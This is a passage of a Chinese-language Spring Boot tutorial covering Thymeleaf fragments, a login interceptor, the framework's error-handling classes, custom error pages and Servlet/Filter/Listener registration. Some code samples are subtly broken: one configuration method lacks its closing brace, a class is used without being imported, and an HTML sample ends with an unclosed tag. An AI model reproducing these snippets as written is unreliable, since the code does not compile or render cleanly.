class=\"hljs-string\">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n        <span class=\"hljs-comment\">&lt;!--自定义公共片段名称--&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">th:fragment</span>=<span class=\"hljs-string\">&quot;copy&quot;</span>&gt;</span>\n            <span class=\"hljs-symbol\">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span>\n</code></div></pre>\n<h4><a id=\"_337\"></a>引入公共代码片段</h4>\n<pre><div class=\"hljs\"><code class=\"lang-html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n...\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">th:insert</span>=<span class=\"hljs-string\">&quot;footer :: copy&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n \n~{templatename::fragmentname} \n~{模板名::代码片段名}\n~{templatename::selector}\n~{模板名::选择器}\n</code></div></pre>\n<h4><a id=\"_351\"></a>三种引入公共代码片段的方式</h4>\n<ul>\n<li><code>th:insert</code></li>\n<li><code>th:replace</code></li>\n<li><code>th:include</code></li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">footer</span> <span class=\"hljs-attr\">th:fragment</span>=<span class=\"hljs-string\">&quot;copy&quot;</span>&gt;</span>\n    <span class=\"hljs-symbol\">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">footer</span>&gt;</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n...\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">th:insert</span>=<span class=\"hljs-string\">&quot;footer :: copy&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">th:replace</span>=<span class=\"hljs-string\">&quot;footer :: copy&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">th:include</span>=<span class=\"hljs-string\">&quot;footer :: copy&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n...<span class=\"hljs-comment\">&lt;!--th:insert将整个片段直接插入到指定标签中--&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">footer</span>&gt;</span>\n            <span class=\"hljs-symbol\">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">footer</span>&gt;</span>\n    .<span class=\"hljs-comment\">&lt;!--th:replace将整个片段替换原来的标签--&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">footer</span>&gt;</span>\n        <span class=\"hljs-symbol\">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">footer</span>&gt;</span>\n    .<span class=\"hljs-comment\">&lt;!--th:include将片段的内容引入到指定标签中--&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>\n        <span class=\"hljs-symbol\">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n&lt;/body\n</code></div></pre>\n<h3><a id=\"_391\"></a>添加视图映射和拦截器</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> com.example.config;\n<span class=\"hljs-keyword\">import</span> com.example.component.LoginHandleInterceptor;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Configuration;\n<span class=\"hljs-keyword\">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;\n<span class=\"hljs-keyword\">import</span> org.springframework.web.servlet.config.annotation.ViewControllerRegistry;\n<span class=\"hljs-keyword\">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n<span class=\"hljs-meta\">@Configuration</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyMVCConfiguration</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">WebMvcConfigurer</span> {\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">addViewControllers</span><span class=\"hljs-params\">(ViewControllerRegistry registry)</span> {\n        registry.addViewController(<span class=\"hljs-string\">&quot;/&quot;</span>).setViewName(<span class=\"hljs-string\">&quot;login&quot;</span>);\n\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">addInterceptors</span><span class=\"hljs-params\">(InterceptorRegistry registry)</span> {\n        registry.addInterceptor(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">LoginHandleInterceptor</span>()).addPathPatterns(<span class=\"hljs-string\">&quot;/**&quot;</span>).excludePathPatterns(<span class=\"hljs-string\">&quot;/&quot;</span>, <span class=\"hljs-string\">&quot;/login&quot;</span>);\n    }\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">addResourceHandlers</span><span class=\"hljs-params\">(ResourceHandlerRegistry registry)</span> {\n        registry.addResourceHandler(<span class=\"hljs-string\">&quot;/**&quot;</span>).addResourceLocations(\n                <span class=\"hljs-string\">&quot;classpath:/templates/&quot;</span>,\n                <span class=\"hljs-string\">&quot;classpath:/static/&quot;</span>,\n                <span class=\"hljs-string\">&quot;classpath:/resources/&quot;</span>);\n    }\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> com.example.component;\n<span class=\"hljs-keyword\">import</span> org.springframework.web.servlet.HandlerInterceptor;\n<span class=\"hljs-keyword\">import</span> javax.servlet.http.HttpServletRequest;\n<span class=\"hljs-keyword\">import</span> javax.servlet.http.HttpServletResponse;\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">LoginHandleInterceptor</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">HandlerInterceptor</span> {\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-type\">boolean</span> <span class=\"hljs-title function_\">preHandle</span><span class=\"hljs-params\">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class=\"hljs-keyword\">throws</span> Exception {\n       <span class=\"hljs-type\">Object</span> <span class=\"hljs-variable\">LoginSession</span> <span class=\"hljs-operator\">=</span> request.getSession().getAttribute(<span class=\"hljs-string\">&quot;LoginSession&quot;</span>);\n       <span class=\"hljs-keyword\">if</span>(LoginSession == <span class=\"hljs-literal\">null</span>){\n           response.sendRedirect(<span class=\"hljs-string\">&quot;/&quot;</span>);\n           <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;\n       }\n       <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;\n    }\n}\n</code></div></pre>\n<h3><a id=\"_438\"></a>错误处理机制</h3>\n<h4><a id=\"ErrorMvcAutoConfiguration_440\"></a>ErrorMvcAutoConfiguration</h4>\n<ul>\n<li>ErrorPageCustomizer</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*错误产生时发出/error请求 如果配置文件中取不到error.path的值则使用/error请求*/</span>\n<span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">ErrorProperties</span>\n    <span class=\"hljs-meta\">@Value(&quot;${error.path:/error}&quot;)</span>\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">path</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;/error&quot;</span>;\n</code></div></pre>\n<ul>\n<li>BasicErrorController</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*处理/error的控制器*/</span>\n<span class=\"hljs-meta\">@Controller</span>\n<span class=\"hljs-meta\">@RequestMapping({&quot;${server.error.path:${error.path:/error}}&quot;})</span>\n<span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">BasicErrorController</span>{\n    <span class=\"hljs-comment\">/*处理text/html请求类型的错误*/</span>\n    <span class=\"hljs-meta\">@RequestMapping(produces = MediaType.TEXT_HTML_VALUE)</span>\n    <span class=\"hljs-keyword\">public</span> ModelAndView <span class=\"hljs-title function_\">errorHtml</span><span class=\"hljs-params\">(HttpServletRequest request, HttpServletResponse response)</span> {\n        <span class=\"hljs-type\">HttpStatus</span> <span class=\"hljs-variable\">status</span> <span class=\"hljs-operator\">=</span> getStatus(request);\n        Map&lt;String, Object&gt; model = Collections\n            .unmodifiableMap(getErrorAttributes(request, getErrorAttributeOptions(request, MediaType.TEXT_HTML)));\n        response.setStatus(status.value());\n        <span class=\"hljs-type\">ModelAndView</span> <span class=\"hljs-variable\">modelAndView</span> <span class=\"hljs-operator\">=</span> resolveErrorView(request, response, status, model);\n        <span class=\"hljs-keyword\">return</span> (modelAndView != <span class=\"hljs-literal\">null</span>) ? modelAndView : <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ModelAndView</span>(<span class=\"hljs-string\">&quot;error&quot;</span>, model);\n    }\n   <span class=\"hljs-comment\">/*处理其他客户端的错误*/</span>\n    <span class=\"hljs-meta\">@RequestMapping</span>\n    <span class=\"hljs-keyword\">public</span> ResponseEntity&lt;Map&lt;String, Object&gt;&gt; <span class=\"hljs-title function_\">error</span><span class=\"hljs-params\">(HttpServletRequest request)</span> {\n        <span class=\"hljs-type\">HttpStatus</span> <span class=\"hljs-variable\">status</span> <span class=\"hljs-operator\">=</span> getStatus(request);\n        <span class=\"hljs-keyword\">if</span> (status == HttpStatus.NO_CONTENT) {\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ResponseEntity</span>&lt;&gt;(status);\n        }\n        Map&lt;String, Object&gt; body = getErrorAttributes(request, getErrorAttributeOptions(request, MediaType.ALL));\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ResponseEntity</span>&lt;&gt;(body, status);\n    }\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">protected</span> ModelAndView <span class=\"hljs-title function_\">resolveErrorView</span><span class=\"hljs-params\">(HttpServletRequest request, HttpServletResponse response, HttpStatus status,Map&lt;String, Object&gt; model)</span> {\n    <span class=\"hljs-keyword\">for</span> (ErrorViewResolver resolver : <span class=\"hljs-built_in\">this</span>.errorViewResolvers) {\n        <span class=\"hljs-type\">ModelAndView</span> <span class=\"hljs-variable\">modelAndView</span> <span class=\"hljs-operator\">=</span> resolver.resolveErrorView(request, status, model);\n        <span class=\"hljs-keyword\">if</span> (modelAndView != <span class=\"hljs-literal\">null</span>) {\n            <span class=\"hljs-keyword\">return</span> modelAndView;\n        }\n    }\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@FunctionalInterface</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">interface</span> <span class=\"hljs-title class_\">ErrorViewResolver</span> {\n\n	<span class=\"hljs-comment\">/**\n	 * Resolve an error view for the specified details.\n	 * <span class=\"hljs-doctag\">@param</span> request the source request\n	 * <span class=\"hljs-doctag\">@param</span> status the http status of the error\n	 * <span class=\"hljs-doctag\">@param</span> model the suggested model to be used with the view\n	 * <span class=\"hljs-doctag\">@return</span> a resolved {<span class=\"hljs-doctag\">@link</span> ModelAndView} or {<span class=\"hljs-doctag\">@code</span> null}\n	 */</span>\n	ModelAndView <span class=\"hljs-title function_\">resolveErrorView</span><span class=\"hljs-params\">(HttpServletRequest request, HttpStatus status, Map&lt;String, Object&gt; model)</span>;\n\n}\n</code></div></pre>\n<ul>\n<li>DefaultErrorViewResolver</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*对错误请求进行视图解析*/</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DefaultErrorViewResolver</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">ErrorViewResolver</span>, Ordered {\n<span class=\"hljs-keyword\">public</span> ModelAndView <span class=\"hljs-title function_\">resolveErrorView</span><span class=\"hljs-params\">(HttpServletRequest request, HttpStatus status, Map&lt;String, Object&gt; model)</span> {\n    <span class=\"hljs-type\">ModelAndView</span> <span class=\"hljs-variable\">modelAndView</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-built_in\">this</span>.resolve(String.valueOf(status.value()), model);\n    <span class=\"hljs-keyword\">if</span> (modelAndView == <span class=\"hljs-literal\">null</span> &amp;&amp; SERIES_VIEWS.containsKey(status.series())) {\n        modelAndView = <span class=\"hljs-built_in\">this</span>.resolve((String)SERIES_VIEWS.get(status.series()), model);\n    }\n\n    <span class=\"hljs-keyword\">return</span> modelAndView;\n}\n<span class=\"hljs-keyword\">private</span> ModelAndView <span class=\"hljs-title function_\">resolve</span><span class=\"hljs-params\">(String viewName, Map&lt;String, Object&gt; model)</span> {\n    <span class=\"hljs-comment\">/*默认去error路径下找404页面*/</span>\n    <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">errorViewName</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;error/&quot;</span> + viewName;\n    <span class=\"hljs-comment\">/*可以使用模板引擎解析页面*/</span>\n    <span class=\"hljs-type\">TemplateAvailabilityProvider</span> <span class=\"hljs-variable\">provider</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-built_in\">this</span>.templateAvailabilityProviders.getProvider(errorViewName, <span class=\"hljs-built_in\">this</span>.applicationContext);\n    <span class=\"hljs-comment\">/*模板引擎可以使用返回指定的ModelAndView 否则使用resolverResouce方法*/</span>\n    <span class=\"hljs-keyword\">return</span> provider != <span class=\"hljs-literal\">null</span> ? <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ModelAndView</span>(errorViewName, model) : <span class=\"hljs-built_in\">this</span>.resolveResource(errorViewName, model);\n}\n<span class=\"hljs-keyword\">private</span> ModelAndView <span class=\"hljs-title function_\">resolveResource</span><span class=\"hljs-params\">(String viewName, Map&lt;String, Object&gt; model)</span> {\n    String[] var3 = <span class=\"hljs-built_in\">this</span>.resourceProperties.getStaticLocations();\n    <span class=\"hljs-type\">int</span> <span class=\"hljs-variable\">var4</span> <span class=\"hljs-operator\">=</span> var3.length;\n\n    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> <span class=\"hljs-variable\">var5</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>; var5 &lt; var4; ++var5) {\n        <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">location</span> <span class=\"hljs-operator\">=</span> var3[var5];\n\n        <span class=\"hljs-keyword\">try</span> {\n            <span class=\"hljs-type\">Resource</span> <span class=\"hljs-variable\">resource</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-built_in\">this</span>.applicationContext.getResource(location);\n            <span class=\"hljs-comment\">/*在静态资源文件夹下找error/404.html页面*/</span>\n            resource = resource.createRelative(viewName + <span class=\"hljs-string\">&quot;.html&quot;</span>);\n            <span class=\"hljs-keyword\">if</span> (resource.exists()) {\n                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ModelAndView</span>(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">DefaultErrorViewResolver</span>.HtmlResourceView(resource), model);\n            }\n        } <span class=\"hljs-keyword\">catch</span> (Exception var8) {\n        }\n    }\n\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;\n}\n}\n</code></div></pre>\n<ul>\n<li>DefaultErrorAttributes</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*获取错误数据属性*/</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DefaultErrorAttributes</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">ErrorAttributes</span> {\n    <span class=\"hljs-meta\">@Deprecated</span>\n    <span class=\"hljs-keyword\">public</span> Map&lt;String, Object&gt; <span class=\"hljs-title function_\">getErrorAttributes</span><span class=\"hljs-params\">(ServerRequest request, <span class=\"hljs-type\">boolean</span> includeStackTrace)</span> {\n        Map&lt;String, Object&gt; errorAttributes = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">LinkedHashMap</span>();\n        errorAttributes.put(<span class=\"hljs-string\">&quot;timestamp&quot;</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>());\n        errorAttributes.put(<span class=\"hljs-string\">&quot;path&quot;</span>, request.path());\n        <span class=\"hljs-type\">Throwable</span> <span class=\"hljs-variable\">error</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-built_in\">this</span>.getError(request);\n        MergedAnnotation&lt;ResponseStatus&gt; responseStatusAnnotation = MergedAnnotations.from(error.getClass(), SearchStrategy.TYPE_HIERARCHY).get(ResponseStatus.class);\n        <span class=\"hljs-type\">HttpStatus</span> <span class=\"hljs-variable\">errorStatus</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-built_in\">this</span>.determineHttpStatus(error, responseStatusAnnotation);\n        errorAttributes.put(<span class=\"hljs-string\">&quot;status&quot;</span>, errorStatus.value());\n        errorAttributes.put(<span class=\"hljs-string\">&quot;error&quot;</span>, errorStatus.getReasonPhrase());\n        errorAttributes.put(<span class=\"hljs-string\">&quot;message&quot;</span>, <span class=\"hljs-built_in\">this</span>.determineMessage(error, responseStatusAnnotation));\n        errorAttributes.put(<span class=\"hljs-string\">&quot;requestId&quot;</span>, request.exchange().getRequest().getId());\n        <span class=\"hljs-built_in\">this</span>.handleException(errorAttributes, <span class=\"hljs-built_in\">this</span>.determineException(error), includeStackTrace);\n        <span class=\"hljs-keyword\">return</span> errorAttributes;\n    }\n}\n</code></div></pre>\n<p>有模板引擎的情况下会找error文件夹下的状态码.html</p>\n<pre><div class=\"hljs\"><code class=\"lang-html\"><span class=\"hljs-comment\">&lt;!--404.html--&gt;</span>\n<span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span>  <span class=\"hljs-attr\">xmlns:th</span>=<span class=\"hljs-string\">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Title<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h1</span>&gt;</span>[[${status}]]<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h1</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h1</span>&gt;</span>[[${timestamp}]]<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h1</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h1</span>&gt;</span>[[${path}]]<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h1</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h1</span>&gt;</span>[[${error}]]<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h1</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h1</span>&gt;</span>[[${message}]]<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h1</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h1</span>&gt;</span>[[${requestId}]]<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h1</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span>\n</code></div></pre>\n<p>没有模板引擎的情况下会从静态文件夹下找error/状态码.html</p>\n<h3><a id=\"Servlet_599\"></a>配置外部Servlet容器</h3>\n<h4><a id=\"_601\"></a>全局配置文件</h4>\n<pre><code class=\"lang-properties\">server.port=8888\n</code></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*修改和server有关的配置*/</span>\n<span class=\"hljs-meta\">@ConfigurationProperties(prefix = &quot;server&quot;,ignoreUnknownFields = true)</span>\n<span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">ServerProperties</span>\n</code></div></pre>\n<h3><a id=\"Servlet_613\"></a>注册Servlet三大组件</h3>\n<h4><a id=\"Servlet_615\"></a>Servlet</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\">ServletRegistrationBean\n</code></div></pre>\n<h4><a id=\"Filter_621\"></a>Filter</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\">FilterRegistrationBean\n</code></div></pre>\n<h4><a id=\"Listener_627\"></a>Listener</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\">ServletListenerRegistrationBean\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> com.example.config;\n<span class=\"hljs-keyword\">import</span> com.example.component.MyFilter;\n<span class=\"hljs-keyword\">import</span> com.example.component.MyListener;\n<span class=\"hljs-keyword\">import</span> com.example.component.MyServlet;\n<span class=\"hljs-keyword\">import</span> org.springframework.boot.web.server.ConfigurableWebServerFactory;\n<span class=\"hljs-keyword\">import</span> org.springframework.boot.web.server.WebServerFactoryCustomizer;\n<span class=\"hljs-keyword\">import</span> org.springframework.boot.web.servlet.FilterRegistrationBean;\n<span class=\"hljs-keyword\">import</span> org.springframework.boot.web.servlet.ServletListenerRegistrationBean;\n<span class=\"hljs-keyword\">import</span> org.springframework.boot.web.servlet.ServletRegistrationBean;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Bean;\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Configuration;\n<span class=\"hljs-keyword\">import</span> java.util.Collections;\n<span class=\"hljs-meta\">@Configuration</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyServletConfig</span> {\n    <span class=\"hljs-comment\">/*配置tomcat容器端口号*/</span>\n    <span class=\"hljs-meta\">@Bean</span>\n    <span class=\"hljs-keyword\">public</span> WebServerFactoryCustomizer&lt;ConfigurableWebServerFactory&gt; <span class=\"hljs-title function_\">webServerFactoryCustomizer</span><span class=\"hljs-params\">()</span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">WebServerFactoryCustomizer</span>&lt;ConfigurableWebServerFactory&gt;() {\n            <span class=\"hljs-meta\">@Override</span>\n            <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">customize</span><span class=\"hljs-params\">(ConfigurableWebServerFactory factory)</span> {\n                factory.setPort(<span class=\"hljs-number\">8888</span>);\n            }\n        };\n    }\n    <span class=\"hljs-comment\">/*注册Servlet*/</span>\n    <span class=\"hljs-meta\">@Bean</span>\n    <span class=\"hljs-keyword\">public</span> ServletRegistrationBean&lt;MyServlet&gt; <span class=\"hljs-title function_\">servletRegistrationBean</span><span class=\"hljs-params\">()</span> {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ServletRegistrationBean</span>&lt;&gt;(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">MyServlet</span>(), <span class=\"hljs-string\">&quot;/myServlet/*&quot;</span>);\n    }\n    <span class=\"hljs-comment\">/*注册Filter*/</span>\n    <span class=\"hljs-meta\">@Bean</span>\n    <span class=\"hljs-keyword\">public</span> FilterRegistrationBean&lt;MyFilter&gt; <span class=\"hljs-title function_\">filterFilterRegistrationBean</span><span class=\"hljs-params\">()</span> {\n        FilterRegistrationBean&lt;MyFilter&gt; filterRegistrationBean = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">FilterRegistrationBean</span>&lt;&gt;();\n        filterRegistrationBean.setFilter(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">MyFilter</span>());\n        filterRegistrationBean.setUrlPatterns(Collections.singletonList(<span class=\"hljs-string\">&quot;/myServlet&quot;</span>));\n        <span class=\"hljs-keyword\">return</span> filterRegistrationBean;\n    }\n    <span class=\"hljs-comment\">/*注册Listener*/</span>\n    <span class=\"hljs-meta\">@Bean</span>\n    <span class=\"hljs-keyword\">public</span> ServletListenerRegistrationBean&lt;MyListener&gt; <span class=\"hljs-title function_\">servletListenerRegistrationBean</span><span class=\"hljs-params\">()</span> {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ServletListenerRegistrationBean</span>&lt;&gt;(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">MyListener</span>());\n    }\n}\n</code></div></pre>\n<h4><a id=\"myFilter_679\"></a>myFilter</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> com.example.component;\n<span class=\"hljs-keyword\">import</span> javax.servlet.FilterChain;\n<span class=\"hljs-keyword\">import</span> javax.servlet.ServletException;\n<span class=\"hljs-keyword\">import</span> javax.servlet.http.HttpFilter;\n<span class=\"hljs-keyword\">import</span> javax.servlet.http.HttpServletRequest;\n<span class=\"hljs-keyword\">import</span> javax.servlet.http.HttpServletResponse;\n<span class=\"hljs-keyword\">import</span> java.io.IOException;\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyFilter</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_\">HttpFilter</span> {\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">doFilter</span><span class=\"hljs-params\">(HttpServletRequest request, HttpServletResponse response, FilterChain chain)</span> <span class=\"hljs-keyword\">throws</span> IOException, ServletException {\n        System.out.println(<span class=\"hljs-string\">&quot;Filter had run!&quot;</span>);\n        chain.doFilter(request, response);\n    }\n}\n</code></div></pre>\n<h4><a id=\"myListener_698\"></a>myListener</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> com.example.component;\n<span class=\"hljs-keyword\">import</span> javax.servlet.ServletContextEvent;\n<span class=\"hljs-keyword\">import</span> javax.servlet.ServletContextListener;\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyListener</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">ServletContextListener</span> {\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">contextInitialized</span><span class=\"hljs-params\">(ServletContextEvent sce)</span> {\n        System.out.println(<span class=\"hljs-string\">&quot;the project is running&quot;</span>);\n    }\n\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> 